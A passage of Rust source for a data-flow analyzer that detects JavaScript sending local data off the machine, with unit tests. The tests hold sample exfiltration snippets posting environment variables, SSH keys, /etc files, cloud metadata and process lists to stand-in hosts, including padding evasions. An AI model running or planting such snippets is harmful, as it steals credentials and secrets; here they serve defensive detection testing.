                                self.reach_adds.push((k, ENV_NAME, entry.clone()));
                            }
                        }
                        V::empty()
                    }
                }
            });
        }
        // a function that reads local data, as a value: `tryGet(os.hostname)`
        if let Some(n) = &name {
            if !computed && self.sc_reader_name(n) {
                let m = self.m;
                let names: Vec<PyStr> = self
                    .p
                    .descs_of_expr(m, node, scope, 0)
                    .into_iter()
                    .filter_map(|d| if let D::Builtin(b) = d { Some(b) } else { None })
                    .collect();
                if let Some(v) = self.sc_module_source(&names, at, line) {
                    return Some(v);
                }
            }
        }
        // a member of `this`
        if !computed {
            if let Some(b) = self.sc_this_member(node, scope) {
                return Some(self.read(b));
            }
        }
        None
    }

    /// supply mode: a call (sources, sends, connections, clients,
    /// callbacks). Its value.
    pub(super) fn sc_call(&mut self, node: NodeId, recv: &V, callee_val: &V, args: &[V], spread: isize, scope: ScopeId) -> R<V> {
        let callee = self.a().unwrap(self.a().at(node, jt::A));
        let member = self.a().kind(callee) == Kind::MemberExpression;
        let name: Option<PyStr> = if member {
            self.a().prop_name(callee)
        } else if self.a().is_ident(callee) {
            Some(self.a().name(callee).to_vec())
        } else {
            None
        };
        let named = |n: &str| name.as_deref().is_some_and(|x| eq(x, n));
        let names = self.sc_names(callee, scope);
        // a read of local data: its value, and its callbacks get it
        if let Some(src) = self.sc_source_call(node, &names, args) {
            let cb = self.sc_callbacks(node, &src, scope);
            return Ok(src.union(&cb.plain()));
        }
        // sends
        let mut spec = send_spec(&names);
        if spec.is_none() && callee_val.kind & OBJ_CLIENT != 0 && !member {
            spec = Some(SEND1);
        }
        if spec.is_none() && member && recv.kind & OBJ_CLIENT != 0 {
            if named("post") || named("put") || named("patch") {
                spec = Some(SEND1);
            } else if named("request") {
                spec = Some(REQUEST2);
            } else if named("get") {
                spec = Some(ADDRESS);
            }
        }
        if spec.is_none() && member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_WRITES)) {
            spec = Some(OPTIONS);
        }
        if spec.is_none() && name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) {
            // a network program run with data on its command line
            let sup = self.sup();
            let a = self.a();
            let list = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (list.first(), list.last()) {
                let text = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                if sup.p().re("_LD_NET_PROGRAM_RE").search(text).is_some() {
                    spec = Some(OPTIONS);
                }
            }
        }
        if let Some(spec) = spec {
            self.sc_send(node, spec, args, spread, scope);
        }
        // the script's own wrapper of exec: its parameter is the command line
        if name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) && self.sc_command_line(node).is_none() {
            if let Some(first) = args.first() {
                if !first.params.is_empty() {
                    let at = self.a().0.nodes[node as usize].start;
                    let label = Rc::new(self.p.fns[self.fid as usize].label());
                    let entry: Entry = (self.m, at, label, false);
                    for &key in first.params.iter() {
                        self.reach_adds.push((key, EXEC_CMD, entry.clone()));
                    }
                }
            }
        }
        // `src.pipe(connection)`: what the stream holds is sent
        if member && named("pipe") && args.iter().any(|a| a.kind & OBJ_CONN != 0) {
            let at = self.a().0.nodes[node as usize].start;
            let label = Rc::new(self.p.fns[self.fid as usize].label());
            self.sc_reach(&recv.plain(), SEND_DATA, at, &label);
        }
        // a selection of the environment's variables (`Object.entries(process.env)
        // .filter(([k]) => k.startsWith('X_'))`) is not the whole of it, unless
        // the test excludes some or names secrets (the text follower's _LD_ENV_SELECT_RE)
        if member && named("filter") && recv.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
            let sup = self.sup();
            let a = self.a();
            let list = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (list.first(), list.last()) {
                let cond = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                let p = sup.p();
                if p.re("_LD_EXCLUDES_RE").search(cond).is_none() && p.re("_SH_SECRET_VAR_RE").search(cond).is_none() {
                    return Ok(V::empty());
                }
            }
        }
        // a number or a flag: not the data; a child process: not what it
        // was given (what it prints is local data only for a command known
        // to print some: sc_source_call)
        if names.iter().any(|n| is_one(n, NUMERIC)) || (member && named("byteLength")) {
            return Ok(V::empty());
        }
        let child = names.iter().any(|n| {
            n.len() > 14 && eq(&n[..14], "child_process.")
        }) || name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES) || is_one(n, &["spawn", "fork"]));
        if child {
            // (its callbacks still run: an exec's callback gets nothing local)
            let tg = self.p.call_targets(self.m, node, scope);
            if !tg.0.is_empty() {
                let line = self.call_line(node);
                return Ok(self.apply(node, &tg.0.clone(), args, spread, line, false));
            }
            return Ok(V::empty());
        }
        // the functions it reaches, as in project mode
        let tg = self.p.call_targets(self.m, node, scope);
        let (fids, how) = (tg.0.clone(), tg.1);
        let definite = how == descs::How::Definite;
        let line = self.call_line(node);
        let mut v;
        if !fids.is_empty() {
            v = self.apply(node, &fids, args, spread, line, false);
            if !definite {
                let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                v = v.union(&union_all(&plains)).union(&recv.plain());
            }
        } else if name.as_deref().is_some_and(|n| is_in(CLEAN_RESULT, n)) {
            v = V::empty();
        } else {
            let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
            v = union_all(&plains).union(&recv.plain());
            if !member {
                v = v.union(&callee_val.plain());
            } else if named("join") || named("concat") {
                v = v.with_built();
            }
        }
        // callbacks of anything but the script's functions get what the call holds
        if fids.is_empty() {
            let mut held = recv.plain();
            for a in args {
                held = held.union(&a.plain());
            }
            let cb = self.sc_callbacks(node, &held, scope);
            v = v.union(&cb.plain());
        }
        // a container a value is put into holds it
        if member && (named("push") || named("unshift")) {
            let obj = self.a().at(callee, jt::A);
            if self.a().kind(obj) == Kind::Identifier {
                if let Some(b) = self.bind(obj, scope) {
                    if self.p.binds[b as usize].kind != BindKind::Import {
                        let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                        self.write(b, union_all(&plains), false);
                    }
                }
            }
        }
        // what the call makes: a connection, a client; a connection's own
        // methods give it back
        let mut mark = 0u8;
        if makes_connection(&names) || (member && (named("request") || named("connect") || named("createConnection"))) {
            mark |= OBJ_CONN;
        }
        if makes_client(&names) {
            mark |= OBJ_CLIENT;
        }
        if member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_CHAIN)) {
            mark |= OBJ_CONN;
        }
        if mark != 0 {
            v = V { kind: v.kind | mark, ..v };
        }
        Ok(v)
    }

    /// supply mode: `new X(…)`: a connection (a socket, an XMLHttpRequest,
    /// a WebSocket), a Request (a send).
    pub(super) fn sc_new(&mut self, node: NodeId, args: &[V], spread: isize, scope: ScopeId) -> V {
        let callee = self.a().at(node, jt::A);
        let names = self.sc_names(callee, scope);
        let simple: Option<PyStr> = {
            let a = self.a();
            if a.is_ident(callee) {
                Some(a.name(callee).to_vec())
            } else if a.kind(callee) == Kind::MemberExpression {
                a.prop_name(callee)
            } else {
                None
            }
        };
        let is_named = |n: &str| simple.as_deref().is_some_and(|x| eq(x, n)) || names.iter().any(|x| eq(last_part(x), n));
        if is_named("Request") {
            self.sc_send(node, SEND1, args, spread, scope);
        }
        let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
        let mut v = union_all(&plains);
        if is_named("Socket") || is_named("XMLHttpRequest") || is_named("WebSocket") {
            v = V { kind: v.kind | OBJ_CONN, ..v };
        }
        v
    }
}

// ---------------------------------------------------------------- the answer --

/// What the tree says about a text: the first send of local data (offset,
/// kind, what, whether only an address held it), none, or that it could
/// not say (the text follower answers).
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Answer {
    Found(usize, &'static str, PyStr, bool),
    Nothing,
    Unread,
}

/// The names that hold a path outside the package (core's `outside`, read
/// from the assignments of the module's bindings instead of a pattern for
/// assignments).
fn outside_names(prog: &Program, sup: &Supply) -> HashSet<PyStr> {
    let p = sup.p();
    let path_expr = p.re("_LD_PATH_EXPR_RE");
    let own_folder = p.re("_LD_OWN_FOLDER_RE");
    let fs_root = p.re("_LD_FS_ROOT_RE");
    let home = p.re("_LD_HOME_RE");
    let mut values: Vec<(PyStr, u32, u32)> = Vec::new();
    for b in &prog.binds {
        for w in &b.writes {
            if let Write::Init { node, path, .. } | Write::Assign { node, path, .. } = w {
                if path.is_empty() && b.module == 0 {
                    let n = &prog.mods[0].tree.nodes[*node as usize];
                    values.push((b.name.clone(), n.start, n.end));
                }
            }
        }
    }
    let mut outside: HashSet<PyStr> = HashSet::new();
    for (name, lo, hi) in &values {
        let value = pystr::strip(sup.span(*lo, *hi));
        if path_expr.match_(value).is_some()
            && own_folder.search(value).is_none()
            && (fs_root.match_(value).is_some() || home.search(value).is_some())
        {
            outside.insert(name.clone());
        }
    }
    for _ in 0..p.usize("_DD_PASSES") {
        if outside.is_empty() {
            break;
        }
        let mut grown = false;
        for (name, lo, hi) in &values {
            if outside.contains(name) {
                continue;
            }
            let value = sup.span(*lo, *hi);
            if path_expr.match_(pystr::lstrip(value)).is_some() && own_folder.search(value).is_none() {
                let uses = p.re("_LD_NAME_TOKEN_RE").finditer(value).any(|m| outside.contains(m.group0()));
                if uses {
                    outside.insert(name.clone());
                    grown = true;
                }
            }
        }
        if !grown {
            break;
        }
    }
    outside
}

/// The first send of local data in a JavaScript text, read on its tree.
pub fn local_data_sent(text: &[u32]) -> Answer {
    if text.len() > MAX_FILE {
        return Answer::Unread;
    }
    let text = text.to_vec();
    crate::api::on_own_stack(move || local_data_sent_here(&text))
}

fn local_data_sent_here(text: &[u32]) -> Answer {
    let pack = crate::pack::current();
    let path = u("script.js");
    let tree = match crate::jsparse::parse_file(&path, text) {
        Ok(t) => t,
        // (TypeScript, which the hosts hand as JavaScript)
        Err(_) => match crate::jsparse::parse_file(&u("script.ts"), text) {
            Ok(t) => t,
            Err(_) => return Answer::Unread,
        },
    };
    let sup = Rc::new(Supply::new(pack, text));
    let mut cfg = Config::new(&[], &[], &[], &[]);
    cfg.supply = Some(sup.clone());
    let mut prog = Program::new(Rc::new(cfg));
    prog.add_module(&path, tree, 0);
    prog.resolve_module(0);
    let outside = outside_names(&prog, &sup);
    *sup.outside.borrow_mut() = outside;
    let mut findings: Vec<Out> = Vec::new();
    let notes = fixpoint(&mut prog, &mut findings);
    if notes.iter().any(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
        return Answer::Unread;
    }
    // the strongest send: data over what only an address holds, a harvest
    // over other data, then the first
    let mut best: Option<((bool, bool, u32), &'static str, PyStr)> = None;
    for f in findings {
        if let Out::Send { at, kind, what, in_address: weak } = f {
            let rank = (weak, weak || !harvest_of(sup.p(), kind, &what, &sup.whole), at);
            if best.as_ref().map_or(true, |(r, _, _)| rank < *r) {
                best = Some((rank, kind, what));
            }
        }
    }
    match best {
        Some(((weak, _, at), kind, what)) => Answer::Found(at as usize, kind, what, weak),
        None => Answer::Nothing,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOST: &str = "collect.invalid";

    fn sent(src: &str) -> Option<(&'static str, String, bool)> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        match local_data_sent_here(&text) {
            Answer::Found(_at, kind, what, in_address) => {
                Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
            }
            Answer::Nothing => None,
            Answer::Unread => panic!("not read: {}", src),
        }
    }

    fn found(kind: &'static str, what: &str) -> Option<(&'static str, String, bool)> {
        Some((kind, what.to_string(), false))
    }

    #[test]
    fn the_environment_by_variable_and_whole() {
        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n{}", post)), found("environment", "NPM_TOKEN"));
        assert_eq!(sent(&format!("const v = JSON.stringify(process.env);\n{}", post)), found("environment", "the whole environment"));
        assert_eq!(sent(&format!("const v = {{ ...process.env }};\n{}", post)), found("environment", "the whole environment"));
        // a name read through destructuring is that variable
        assert_eq!(sent(&format!("const {{ USER: v }} = process.env;\n{}", post)), found("identity", "USER"));
        // a variable no client keeps secret is not local data
        assert_eq!(sent(&format!("const v = process.env.NODE_ENV;\n{}", post)), None);
        // a variable only in the address a client sends its key to
        assert_eq!(
            sent(&format!("fetch('https://{}/?k=' + process.env.API_KEY);\n", HOST)),
            Some(("environment", "API_KEY".to_string(), true))
        );
        // a local object named process is not the environment
        assert_eq!(sent(&format!("const process = {{ env: {{ TOKEN: 'x' }} }};\nconst v = process.env.TOKEN;\n{}", post)), None);
    }

    #[test]
    fn the_machine_through_functions_callbacks_and_closures() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // the script's own function
        assert_eq!(
            sent(&format!("const os = require('os');\nfunction send(d) {{ {} }}\nsend(os.hostname());\n", post("d"))),
            found("identity", "hostname")
        );
        // an exec's callback writes a closure's variable, another callback sends it
        let src = format!(
            "const {{ exec }} = require('child_process');\nconst https = require('https');\nlet data = '';\n\
             exec('whoami', (e, out) => {{ data = out; }});\n\
             setTimeout(() => {{ https.request({{ hostname: '{}' }}).end(data); }}, 10);\n",
            HOST
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // a member of this
        let src = format!(
            "const os = require('os');\nclass C {{\n  constructor() {{ this.data = os.hostname(); }}\n  \
             send() {{ {} }}\n}}\nnew C().send();\n",
            post("this.data")
        );
        assert_eq!(sent(&src), found("identity", "hostname"));
        // a name no declaration binds
        assert_eq!(sent(&format!("data = require('os').hostname();\n{}", post("data"))), found("identity", "hostname"));
        // a function of the os module given as a value
        let src = format!("const os = require('os');\nfunction tryGet(f) {{ return f(); }}\n{}", post("tryGet(os.hostname)"));
        assert_eq!(sent(&src), found("identity", "hostname"));
    }

    #[test]
    fn modules_under_other_names() {
        let src = format!("import os from 'os';\nimport axios from 'axios';\naxios.post('https://{}/c', {{ h: os.hostname() }});\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        // require kept under another name (model-providers 99.3.9's form)
        let src = format!(
            "const _req = module.require;\nconst os = _req('os');\nfetch('https://{}/c', {{ method: 'POST', body: os.hostname() }});\n",
            HOST
        );
        assert_eq!(sent(&src), found("identity", "hostname"));
        let src = format!("const r = require;\nconst o = r('os');\nfetch('https://{}/c', {{ method: 'POST', body: o.userInfo() }});\n", HOST);
        assert_eq!(sent(&src), found("identity", "userInfo"));
    }

    #[test]
    fn the_scripts_own_wrappers() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // of exec, given a command line
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfunction run(c) {{ try {{ return execSync(c).toString(); }} catch {{ return ''; }} }}\n{}",
            post("run('whoami')")
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // of a read, given a folder outside the package (elf-stats' form)
        let src = format!(
            "const fs = require('fs');\nfunction dump(dir) {{ return fs.readdirSync(dir).map((f) => fs.readFileSync(dir + '/' + f, 'utf8')); }}\n{}",
            post("JSON.stringify(dump('/etc'))")
        );
        assert_eq!(sent(&src), found("file", "/etc"));
        // of the environment, given a name
        let src = format!("function getEnv(n) {{ return process.env[n]; }}\n{}", post("getEnv('AWS_SECRET_ACCESS_KEY')"));
        assert_eq!(sent(&src), found("environment", "AWS_SECRET_ACCESS_KEY"));
        let src = format!("function getEnv(n) {{ return process.env[n]; }}\n{}", post("getEnv('HOST')"));
        assert_eq!(sent(&src), None);
    }

    #[test]
    fn sends_by_what_makes_them() {
        // a connection, written in a callback
        let src = "const net = require('net');\nconst { execSync } = require('child_process');\nconst out = execSync('ps aux').toString();\n\
                   const c = net.connect(8058, '198.51.100.7', () => { c.write(out); });\n";
        assert_eq!(sent(src), found("report", "ps"));
        // a DNS lookup of a name composed with the data; not of the data alone
        let src = format!("const dns = require('dns');\nconst os = require('os');\ndns.resolve(os.hostname() + '.x.{}', () => {{}});\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        assert_eq!(sent("const dns = require('dns');\nconst os = require('os');\ndns.lookup(os.hostname(), () => {});\n"), None);
        // a host name built from the data is resolved: sent, whatever is done with it
        let src = format!("const os = require('os');\nconst u = 'https://' + os.hostname() + '.{}';\nprobe(u);\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        // a path joined to a fixed host is not a host name
        assert_eq!(sent("const os = require('os');\nprobe('http://x.example' + os.homedir());\n"), None);
        // a child process doesn't hold what it was given; a length is not the data
        let src = "const net = require('net');\nconst { spawn } = require('child_process');\nconst s = net.connect(1, 'h');\n\
                   const c = spawn('x', [], { env: process.env });\nc.stdout.pipe(s);\n";
        assert_eq!(sent(src), None);
        let src = format!("fetch('https://{}/c', {{ headers: {{ 'Content-Length': Buffer.byteLength(JSON.stringify(process.env)) }} }});\n", HOST);
        assert_eq!(sent(&src), None);
    }

    #[test]
    fn a_send_by_the_strongest_data_it_carries() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // the instance's credentials after what whoami prints (psdimporter's form)
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfunction run(c) {{ try {{ return execSync(c).toString(); }} catch {{ return ''; }} }}\n\
             const who = run('whoami');\nconst meta = run('curl -s http://169.254.169.254/latest/meta-data/');\n{}",
            post("`${who} ${meta}`")
        );
        assert_eq!(sent(&src), found("credentials", "the instance's metadata"));
        // a credential store after another file
        let src = format!(
            "const fs = require('fs');\nconst os = require('os');\nconst h = fs.readFileSync('/etc/hosts', 'utf8');\n\
             const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');\n{}",
            post("h + k")
        );
        assert_eq!(sent(&src), found("file", "os.homedir() + '/.ssh/id_rsa'"));
        // of two sends, the whole environment's after the host name's
        let src = format!("const os = require('os');\n{}{}", post("os.hostname()"), post("JSON.stringify(process.env)"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // otherwise the first read
        let src = format!("const fs = require('fs');\nconst os = require('os');\n{}", post("os.hostname() + fs.readFileSync('/etc/hosts')"));
        assert_eq!(sent(&src), found("identity", "hostname"));
    }

    #[test]
    fn evasions_of_the_text_follower() {
        let post = format!("fetch('https://{}/x', {{method: 'POST', body: JSON.stringify(process.env)}});\n", HOST);
        // a quote in a regular expression begins no string
        assert_eq!(sent(&format!("const q = /'/g; {}", post)), found("environment", "the whole environment"));
        // padding before the payload: no window, no cap on assignments
        let mut src = String::from("const v = JSON.stringify(process.env);\n");
        for k in 0..6000 {
            src.push_str(&format!("var a{} = {};\n", k, k));
        }
        src.push_str(&format!("fetch('https://{}/x', {{method: 'POST', body: v}});\n", HOST));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // code in a string is not code
        let src = format!("const doc = `fetch('https://{}/x', {{body: JSON.stringify(process.env)}})`;\n", HOST);
        assert_eq!(sent(&src), None);
    }
}
